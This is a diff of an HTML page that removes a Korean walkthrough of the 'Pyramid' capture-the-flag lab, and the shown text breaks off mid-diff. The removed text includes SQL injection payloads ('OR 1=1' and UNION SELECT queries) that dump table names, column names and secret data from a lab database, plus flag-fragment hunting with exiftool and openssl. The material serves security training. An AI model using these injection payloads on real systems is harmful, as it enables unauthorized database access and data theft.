@@ -1,3743 +1,454 @@
-<html>
+<!DOCTYPE html>
+<html lang="ko">
   <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <meta name="Generator" content="Microsoft Word 15 (filtered)" />
-    <style>
-      <!--
- /* Font Definitions */
- @font-face {
-        font-family: Wingdings;
-        panose-1: 5 0 0 0 0 0 0 0 0 0;
-      }
-      @font-face {
-        font-family: Gulim;
-        panose-1: 2 11 6 0 0 1 1 1 1 1;
-      }
-      @font-face {
-        font-family: "Cambria Math";
-        panose-1: 2 4 5 3 5 4 6 3 2 4;
-      }
-      @font-face {
-        font-family: "Malgun Gothic";
-        panose-1: 2 11 5 3 2 0 0 2 0 4;
-      }
-      @font-face {
-        font-family: GulimChe;
-        panose-1: 2 11 6 9 0 1 1 1 1 1;
-      }
-      @font-face {
-        font-family: Consolas;
-        panose-1: 2 11 6 9 2 2 4 3 2 4;
-      }
-      @font-face {
-        font-family: "Fira Mono";
-        panose-1: 2 11 5 9 5 0 0 2 0 4;
-      }
-      @font-face {
-        font-family: "Noto Sans KR";
-      }
-      @font-face {
-        font-family: "Segoe UI Historic";
-        panose-1: 2 11 5 2 4 2 4 2 2 3;
-      }
-      @font-face {
-        font-family: "\@Malgun Gothic";
-      }
-      @font-face {
-        font-family: "\@GulimChe";
-      }
-      @font-face {
-        font-family: "\@Noto Sans KR";
-      }
-      @font-face {
-        font-family: "\@Gulim";
-        panose-1: 2 11 6 0 0 1 1 1 1 1;
-      }
-      /* Style Definitions */
-      p.MsoNormal,
-      li.MsoNormal,
-      div.MsoNormal {
-        margin-top: 0in;
-        margin-right: 0in;
-        margin-bottom: 8pt;
-        margin-left: 0in;
-        text-align: justify;
-        text-justify: inter-ideograph;
-        line-height: 107%;
-        text-autospace: none;
-        word-break: break-all;
-        font-size: 10pt;
-        font-family: "Malgun Gothic", sans-serif;
-      }
-      a:link,
-      span.MsoHyperlink {
-        color: #0563c1;
-        text-decoration: underline;
-      }
-      p.MsoListParagraph,
-      li.MsoListParagraph,
-      div.MsoListParagraph {
-        margin-top: 0in;
-        margin-right: 0in;
-        margin-bottom: 8pt;
-        margin-left: 40pt;
-        text-align: justify;
-        text-justify: inter-ideograph;
-        line-height: 107%;
-        text-autospace: none;
-        word-break: break-all;
-        font-size: 10pt;
-        font-family: "Malgun Gothic", sans-serif;
-      }
-      span.hljs-string {
-        mso-style-name: hljs-string;
-      }
-      span.hljs-number {
-        mso-style-name: hljs-number;
-      }
-      .MsoChpDefault {
-        font-size: 10pt;
-        font-family: "Malgun Gothic", sans-serif;
-      }
-      .MsoPapDefault {
-        margin-bottom: 8pt;
-        text-align: justify;
-        text-justify: inter-ideograph;
-        line-height: 107%;
-      }
-      /* Page Definitions */
-      @page WordSection1 {
-        size: 595.3pt 841.9pt;
-        margin: 85.05pt 1in 1in 1in;
-      }
-      div.WordSection1 {
-        page: WordSection1;
-      }
-      @page WordSection2 {
-        size: 595.3pt 841.9pt;
-        margin: 85.05pt 1in 1in 1in;
-      }
-      div.WordSection2 {
-        page: WordSection2;
-      }
-      @page WordSection3 {
-        size: 595.3pt 841.9pt;
-        margin: 85.05pt 1in 1in 1in;
-      }
-      div.WordSection3 {
-        page: WordSection3;
-      }
-      @page WordSection4 {
-        size: 595.3pt 841.9pt;
-        margin: 85.05pt 1in 1in 1in;
-      }
-      div.WordSection4 {
-        page: WordSection4;
-      }
-      /* List Definitions */
-      ol {
-        margin-bottom: 0in;
-      }
-      ul {
-        margin-bottom: 0in;
-      }
-    </style>
+    <meta charset="utf-8" />
+    <title>Pyramid CTF Walkthrough</title>
+    <link rel="stylesheet" href="index.css" />
   </head>
-
-  <body
-    lang="EN-US"
-    link="#0563C1"
-    vlink="#954F72"
-    style="word-wrap: break-word"
-  >
-    <div class="WordSection1">
-      <p class="MsoNormal" align="center" style="text-align: center">
-        <b
-          ><span style="font-size: 16pt; line-height: 107%"
-            >Pyramid 1<span lang="KO">단계 </span>SQLi Walkthrough</span
-          ></b
-        >
-      </p>
-
-      <p class="MsoNormal" align="center" style="text-align: center">
-        <span style="font-size: 11pt; line-height: 107%">&nbsp;</span>
-      </p>
-
-      <p class="MsoNormal" align="center" style="text-align: center">
-        <span style="font-size: 11pt; line-height: 107%">&nbsp;</span>
-      </p>
-
-      <p class="MsoNormal" align="left" style="text-align: left">
-        <span style="font-size: 11pt; line-height: 107%"
-          >IP <span lang="KO">확인 후 </span>http
-          <span lang="KO">접속</span></span
-        >
-      </p>
-
-      <p class="MsoNormal">
-        <img
-          width="643"
-          height="549"
-          src="images/image001.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal" align="center" style="text-align: center">
-        <span style="font-size: 11pt; line-height: 107%">&nbsp;</span>
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal" align="center" style="text-align: center">&nbsp;</p>
-
-      <p class="MsoNormal" align="left" style="text-align: left">
-        <span class="hljs-string"
-          ><span
-            style="
-              font-size: 16pt;
-              line-height: 107%;
-              font-family: Consolas;
-              color: #6a8759;
-            "
-            >' OR '</span
-          ></span
-        ><span class="hljs-number"
-          ><span
-            style="
-              font-size: 16pt;
-              line-height: 107%;
-              font-family: Consolas;
-              color: #6896ba;
-            "
-            >1</span
-          ></span
-        ><span class="hljs-string"
-          ><span
-            style="
-              font-size: 16pt;
-              line-height: 107%;
-              font-family: Consolas;
-              color: #6a8759;
-            "
-            >'='</span
-          ></span
-        ><span class="hljs-number"
-          ><span
-            style="
-              font-size: 16pt;
-              line-height: 107%;
-              font-family: Consolas;
-              color: #6896ba;
-            "
-            >1</span
-          ></span
-        >
-      </p>
-
-      <p class="MsoNormal" align="left" style="text-align: left">
-        <span lang="KO" style="font-size: 11pt; line-height: 107%"
-          >가장 기본적인</span
-        ><span style="font-size: 11pt; line-height: 107%">
-          SQLi <span lang="KO">입력해보기 </span>(<span lang="KO"
-            >모든 행을 반환</span
-          >)</span
-        >
-      </p>
-
-      <p class="MsoNormal" align="center" style="text-align: center">
-        <img
-          width="652"
-          height="552"
-          src="images/image002.jpg"
-        />
-      </p>
-
-      <p
-        class="MsoNormal"
-        align="left"
-        style="
-          margin-top: 15pt;
-          margin-right: 0in;
-          margin-bottom: 0in;
-          margin-left: 0in;
-          text-align: left;
-          line-height: normal;
-          text-autospace: ideograph-numeric ideograph-other;
-          word-break: normal;
-        "
-      >
-        <span style="font-size: 13.5pt; font-family: 'Courier New'"
-          >&nbsp;</span
-        >
-      </p>
-
-      <p
-        class="MsoNormal"
-        align="left"
-        style="
-          margin-top: 15pt;
-          margin-right: 0in;
-          margin-bottom: 0in;
-          margin-left: 0in;
-          text-align: left;
-          line-height: normal;
-          text-autospace: ideograph-numeric ideograph-other;
-          word-break: normal;
-        "
-      >
-        <span lang="KO" style="font-size: 13.5pt">알 수 있는 사실</span>
-      </p>
-
-      <p
-        class="MsoNormal"
-        align="left"
-        style="
-          margin-top: 15pt;
-          margin-right: 0in;
-          margin-bottom: 0in;
-          margin-left: 0in;
-          text-align: left;
-          line-height: normal;
-          text-autospace: ideograph-numeric ideograph-other;
-          word-break: normal;
-        "
-      >
-        &nbsp;
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 38pt; text-indent: -0.25in"
-      >
-        <span style="font-size: 11pt; line-height: 107%"
-          >1.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><span lang="KO" style="font-size: 11pt; line-height: 107%"
-          >입력값이 필터링 없이</span
-        ><span style="font-size: 11pt; line-height: 107%">
-          DB <span lang="KO">쿼리에 직접 사용되고 있다</span>.</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 38pt; text-indent: -0.25in"
-      >
-        <span style="font-size: 11pt; line-height: 107%"
-          >2.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><span style="font-size: 11pt; line-height: 107%"
-          >URL<span lang="KO">에서 파라미터</span> name
-          <span lang="KO">노출되며 </span>GET
-          <span lang="KO">방식으로 서버 전송되고있다</span>.</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 38pt; text-indent: -0.25in"
-      >
-        <span style="font-size: 11pt; line-height: 107%"
-          >3.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><span style="font-size: 11pt; line-height: 107%"
-          >php<span lang="KO">는 총 </span>3<span lang="KO"
-            >개의 칼럼만 표시하고 있다</span
-          >.</span
-        >
-      </p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 38pt; text-indent: -0.25in"
-      >
-        <span style="font-size: 11pt; line-height: 107%"
-          >4.<span style="font: 7pt 'Times New Roman'"
-            >&nbsp;&nbsp;&nbsp;&nbsp;
-          </span></span
-        ><span style="font-size: 11pt; line-height: 107%"
-          >OR<span lang="KO">이 작동하는 것으로 보아 </span>SELECT, OR
-          <span lang="KO">등이</span> php<span lang="KO"
-            >에서 필터링 되지 않고 있다</span
-          >. (sql<span lang="KO">취약점존재</span>)</span
-        >
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p
-        class="MsoListParagraph"
-        align="left"
-        style="margin-left: 38pt; text-align: left; text-indent: -0.25in"
-      >
-        <b
-          ><span style="font-size: 12pt; line-height: 107%"
-            >1.<span style="font: 7pt 'Times New Roman'"
-              >&nbsp;&nbsp;&nbsp;
-            </span></span
-          ></b
-        ><b
-          ><span lang="KO" style="font-size: 12pt; line-height: 107%"
-            >테이블명 추출하는
-          </span></b
-        ><b
-          ><span style="font-size: 12pt; line-height: 107%"
-            >SQLi <span lang="KO">실행</span></span
-          ></b
-        >
-      </p>
-
-      <p class="MsoNormal" align="left" style="text-align: left">
-        <span
-          style="
-            font-size: 16pt;
-            line-height: 107%;
-            font-family: Consolas;
-            color: #6a8759;
-            background: #2b2b2b;
-          "
-          >' UNION SELECT 1, group_concat(table_name), 3 FROM
-          information_schema.tables WHERE table_schema=database() --</span
-        >
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        <img
-          width="664"
-          height="519"
-          src="images/image003.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal" align="center" style="text-align: center">
-        <span style="font-size: 11pt; line-height: 107%"
-          >2<span lang="KO">번째 항목에 테이블이름 출력</span></span
-        >
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 38pt; text-indent: -0.25in"
-      >
-        <b
-          ><span style="font-size: 12pt; line-height: 107%"
-            >2.<span style="font: 7pt 'Times New Roman'"
-              >&nbsp;&nbsp;&nbsp;
-            </span></span
-          ></b
-        ><b
-          ><span lang="KO" style="font-size: 12pt; line-height: 107%"
-            >칼럼명을 추출하는
-          </span></b
-        ><b
-          ><span style="font-size: 12pt; line-height: 107%"
-            >SQLi <span lang="KO">실행</span></span
-          ></b
-        >
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        <span class="hljs-string"
-          ><span
-            style="
-              font-size: 14pt;
-              line-height: 107%;
-              font-family: Consolas;
-              color: #6a8759;
-            "
-            >' UNION SELECT 1, group_concat(column_name), 3 FROM
-            information_schema.columns WHERE table_name='</span
-          ></span
-        ><span
-          style="
-            font-size: 14pt;
-            line-height: 107%;
-            font-family: Consolas;
-            color: #bababa;
-            background: #2b2b2b;
-          "
-          >pharaohs</span
-        ><span class="hljs-string"
-          ><span
-            style="
-              font-size: 14pt;
-              line-height: 107%;
-              font-family: Consolas;
-              color: #6a8759;
-            "
-            >' --</span
-          ></span
-        >
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        <img
-          width="661"
-          height="473"
-          src="images/image004.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal" align="center" style="text-align: center">
-        2<span lang="KO">번째 항목에 모든 칼럼명 출력</span>
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p
-        class="MsoListParagraph"
-        style="margin-left: 38pt; text-indent: -0.25in"
-      >
-        <b
-          ><span style="font-size: 12pt; line-height: 107%"
-            >3.<span style="font: 7pt 'Times New Roman'"
-              >&nbsp;&nbsp;&nbsp;
-            </span></span
-          ></b
-        ><b
-          ><span style="font-size: 12pt; line-height: 107%"
-            >secret_info<span lang="KO">에 담긴 최종힌트를 얻는 </span>SQLi
-            <span lang="KO">실행</span></span
-          ></b
-        >
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        <span
-          style="
-            font-size: 14pt;
-            line-height: 107%;
-            font-family: Consolas;
-            color: #6a8759;
-            background: #2b2b2b;
-          "
-          >' UNION SELECT 1, 2, secret_info FROM pharaohs WHERE id = 6 --</span
-        >
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        <img
-          width="601"
-          height="410"
-          src="images/image005.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal" align="center" style="text-align: center">
-        <span lang="KO">최종 힌트 획득</span>
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        <img
-          width="602"
-          height="98"
-          src="images/image006.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal" align="center" style="text-align: center">
-        <span lang="KO">웹 페이지 소스에 담긴 주석 힌트</span> :
-        <span lang="KO">엄청 긴 문자열</span>
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        <img
-          width="602"
-          height="415"
-          src="images/image007.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal" align="center" style="text-align: center">
-        <span style="color: black; background: #fcfcfc"
-          >ROT13.com <span lang="KO">에서 디코딩</span></span
-        >
-      </p>
-
-      <p class="MsoNormal" align="left" style="text-align: left">
-        <span style="background: #fcfcfc">&nbsp;</span>
-      </p>
-
-      <p class="MsoNormal" align="left" style="text-align: left">
-        <span style="color: black; background: #fcfcfc"
-          >&quot;<span lang="KO"
-            >파라오의 암호는 문지기의 열쇠를 위한 것이 아니라</span
-          >, <span lang="KO">펼쳐지는 나일강 지도의 논리를 위해 존재한다</span>.
-          <span lang="KO">흐름을 따라 다음 방으로 나아가라</span>.&quot;</span
-        >
-      </p>
-
-      <p class="MsoNormal" align="left" style="text-align: left">
-        <span lang="KO" style="color: #222222">이 문구는</span
-        ><span style="color: #222222">
-          SSH <span lang="KO">접속 정보가 아님을 간접적으로 나타내며</span>,
-          <span lang="KO"
-            >다음 웹 디렉토리를 이동해야 함을 비유적으로 알 수 있다</span
-          >.</span
-        >
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        <img
-          width="577"
-          height="62"
-          src="images/image008.png"
-        />
-      </p>
-
-      <p class="MsoNormal">
-        <span lang="KO">최종 힌트를 보면</span> '/'
-        <span lang="KO">표시가 있는데</span>,
-        <span lang="KO">이것을 보고</span>&nbsp;<b
-          ><span lang="KO">디렉토리 경로</span></b
-        ><span lang="KO">라는 것을 유추해볼 수 있다</span>.
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        <span lang="KO">얻은 정보들을 바탕으로 </span
-        >&quot;http://pyramidIP/the_architect_of_the_Great_Pyramid&quot;
-        <span lang="KO">로 이동하면 다음 단계로 넘어간다</span>.
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        <img
-          width="601"
-          height="379"
-          id="그림 9"
-          src="images/image009.jpg"
-        />
-      </p>
-
-      <p class="MsoNormal">
-        trivia
-        <span lang="KO">칼럼의 값들을 조회해보니 어떤 문구와 함께 </span
-        >3000<span lang="KO">자 분량의 반복되는 문자열이 나타난다</span>.
-      </p>
-
-      <p class="MsoNormal">
-        <span lang="KO">해석해본 결과 </span>sqlmap
-        <span lang="KO">자동화 기법이 아닌 수동 </span>SQLi<span lang="KO"
-          >를 유도하는것을 알 수 있다</span
-        >.
-      </p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">&nbsp;</p>
-
-      <p class="MsoNormal">
-        <span lang="KO" style="line-height: 107%">조금</span
-        ><span
-          lang="KO"
-          style="line-height: 107%; font-family: 'Arial', sans-serif"
-        >
-        </span
-        ><span lang="KO" style="line-height: 107%">더</span
-        ><span
-          lang="KO"
-          style="line-height: 107%; font-family: 'Arial', sans-serif"
-        >
-        </span
-        ><span lang="KO" style="line-height: 107%">자세한</span
-        ><span
-          lang="KO"
-          style="line-height: 107%; font-family: 'Arial', sans-serif"
-        >
-        </span
-        ><span lang="KO" style="line-height: 107%">풀이</span
-        ><span style="line-height: 107%; font-family: 'Arial', sans-serif">
-          : </span
-        ><a href="https://mini97.tistory.com/97"
-          ><span style="line-height: 107%; font-family: 'Arial', sans-serif"
-            >https://mini97.tistory.com/97</span
-          ></a
-        ><span style="line-height: 107%; font-family: 'Arial', sans-serif"
-          >  </span
-        ><span lang="KO" style="line-height: 107%">비밀번호</span
-        ><span style="line-height: 107%; font-family: 'Arial', sans-serif"
-          >:cmd</span
-        >
-      </p>
-    </div>
-
-    <span
-      style="
-        font-size: 10pt;
-        line-height: 107%;
-        font-family: 'Arial', sans-serif;
-      "
-      ><br clear="all" style="page-break-before: always" />
-    </span>
-
-    <div class="WordSection2">
-      <table
-        class="MsoTableGrid"
-        border="1"
-        cellspacing="0"
-        cellpadding="0"
-        style="border-collapse: collapse; border: none"
-      >
-        <tr>
-          <td
-            width="601"
-            valign="top"
-            style="
-              width: 450.8pt;
-              border: solid windowtext 1pt;
-              padding: 0in 5.4pt 0in 5.4pt;
-            "
-          >
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              Pyramid (2) _find split fragment and decryption
-            </p>
-          </td>
-        </tr>
-        <tr>
-          <td
-            width="601"
-            valign="top"
-            style="
-              width: 450.8pt;
-              border: solid windowtext 1pt;
-              border-top: none;
-              padding: 0in 5.4pt 0in 5.4pt;
-            "
-          >
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              <span style="font-family: Wingdings"
-                >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-              ><a
-                href="http://192.168.16.36/the_architect_of_the_Great_Pyramid/"
-                >http://192.168.16.36/the_architect_of_the_Great_Pyramid/</a
-              >
-              <span lang="KO">으로 접속 </span>
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              <img
-                border="0"
-                width="602"
-                height="167"
-                src="images/image010.jpg"
-              />
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              <span lang="KO">힌트로 </span>fragment 3<span lang="KO"
-                >가지가 있고 이걸 조합하는 방법 그리고 그 위치가 적혀있음
-              </span>
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; text-indent: 10pt; line-height: normal"
-            >
-              ============================================================
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; text-indent: 10pt; line-height: normal"
-            >
-              &nbsp;
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              1.<span style="font: 7pt 'Times New Roman'"
-                >&nbsp;&nbsp;&nbsp;&nbsp; </span
-              >Fragment1<span lang="KO">을 찾기 위해 </span>View page
-              source<span lang="KO">를 보면 </span>
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-               <img
-                border="0"
-                width="234"
-                height="53"
-                src="images/image011.png"
-              />
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              <span style="font-family: Wingdings"
-                >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-              >Xv9A<span lang="KO">를 확인할 수 있음</span>
-            </p>
-            <p
-              class="MsoNormal"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 20pt;
-                line-height: normal;
-              "
-            >
-               
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-               =============================================================
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              2.<span style="font: 7pt 'Times New Roman'"
-                >&nbsp;&nbsp;&nbsp;&nbsp; </span
-              >Fragment2<span lang="KO">를 찾기 위해</span>
-            </p>
-            <p
-              class="MsoNormal"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 20pt;
-                text-indent: 10pt;
-                line-height: normal;
-              "
-            >
-               <a
-                href="http://192.168.16.36/the_architect_of_the_Great_Pyramid/assets/script.js"
-                >http://192.168.16.36/the_architect_of_the_Great_Pyramid/assets/script.js</a
-              >
-              <span lang="KO">로 접속 </span>
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-               <img
-                border="0"
-                width="379"
-                height="103"
-                src="images/image012.png"
-              />
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              <span style="font-family: Wingdings"
-                >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-              >MuS7<span lang="KO">이라는 </span>hex
-              <span lang="KO">힌트가 있음 </span>
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-               =============================================================
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              3.<span style="font: 7pt 'Times New Roman'"
-                >&nbsp;&nbsp;&nbsp;&nbsp; </span
-              >Fragment3<span lang="KO">을 찾기 위해 </span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                line-height: normal;
-              "
-            >
-              <a
-                href="http://192.168.16.36/the_architect_of_the_Great_Pyramid/assets/hint.png"
-                >http://192.168.16.36/the_architect_of_the_Great_Pyramid/assets/hint.png</a
-              ><span lang="KO">로 접속하면 </span>
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              <img
-                border="0"
-                width="101"
-                height="43"
-                src="images/image013.jpg"
-              />
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              <span style="font-family: Wingdings"
-                >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-              ><span lang="KO">아무것도 없음 그래서 우리는 얘를 </span>kali<span
-                lang="KO"
-                >로 옮겨서 확인을 해보자</span
-              >.
-            </p>
-          </td>
-        </tr>
-        <tr>
-          <td
-            width="601"
-            valign="top"
-            style="
-              width: 450.8pt;
-              border: solid windowtext 1pt;
-              border-top: none;
-              padding: 0in 5.4pt 0in 5.4pt;
-            "
-          >
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              <span style="font-family: Wingdings"
-                >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-              ><span lang="KO">첫 페이지에서</span> metadata<span lang="KO"
-                >는 사실을 알려주었다</span
-              >. <span lang="KO">그런데 사진에 아무것도 보이지 않음 </span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              <span style="font-family: Wingdings"
-                >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-              ><span lang="KO">그래서 우리는 데이터 이미지를 저장하고 </span
-              >hint.png<span lang="KO">에 숨겨진 것을 찾아보자 </span>
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              <span style="font-family: Wingdings"
-                >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-              >Metadata <span lang="KO">관련한 대표적인 </span>tool<span
-                lang="KO"
-                >이 </span
-              >exiftool <span lang="KO">이다</span>.
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-               <img
-                border="0"
-                width="284"
-                height="324"
-                src="images/image014.jpg"
-              />
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              <span style="font-family: Wingdings"
-                >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-              >Comment <span lang="KO">부분에 의심이 되는 </span>‘z9Qp’
-              <span lang="KO">가 있다</span>.
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-               ============================================================
-            </p>
-            <p
-              class="MsoNormal"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 20pt;
-                line-height: normal;
-              "
-            >
-              &nbsp;
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              4.<span style="font: 7pt 'Times New Roman'"
-                >&nbsp;&nbsp;&nbsp;&nbsp; </span
-              ><span lang="KO">이제 모아놓은 </span>fragment
-              <span lang="KO">값을 합한다</span>.
-            </p>
-            <p
-              class="MsoNormal"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 20pt;
-                line-height: normal;
-              "
-            >
-              <img
-                border="0"
-                width="348"
-                height="297"
-                src="images/image015.png"
-              />
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-               
-            </p>
-            <p
-              class="MsoNormal"
-              style="margin-bottom: 0in; line-height: normal"
-            >
-              =============================================================
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              5.<span style="font: 7pt 'Times New Roman'"
-                >&nbsp;&nbsp;&nbsp;&nbsp; </span
-              >the_architect_of_the_Great_Pyramid/
-              <span lang="KO">페이지 하단에 암호화 복호화 관련 내용 기술 </span>
-            </p>
-            <p
-              class="MsoNormal"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 20pt;
-                line-height: normal;
-              "
-            >
-              <img
-                border="0"
-                width="510"
-                height="55"
-                src="images/image016.jpg"
-              />
-            </p>
-            <p
-              class="MsoNormal"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 20pt;
-                line-height: normal;
-              "
-            >
-              keyhex=$(echo -n &quot;$concat&quot; | openssl dgst -sha256
-              -binary | xxd -p -c 256 | cut -c1-32)
-            </p>
-            <p
-              class="MsoNormal"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 20pt;
-                line-height: normal;
-              "
-            >
-              echo &quot;Derived key (hex,16 bytes): $keyhex&quot;
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
-              <span style="font-family: Wingdings"
-                >è<span style="font: 7pt 'Times New Roman'">&nbsp; </span></span
-              >key<span lang="KO">를 획득한 모습을 볼 수 있음</span>.
-            </p>
-            <p
-              class="MsoListParagraph"
-              style="
-                margin-top: 0in;
-                margin-right: 0in;
-                margin-bottom: 0in;
-                margin-left: 38pt;
-                text-indent: -0.25in;
-                line-height: normal;
-              "
-            >
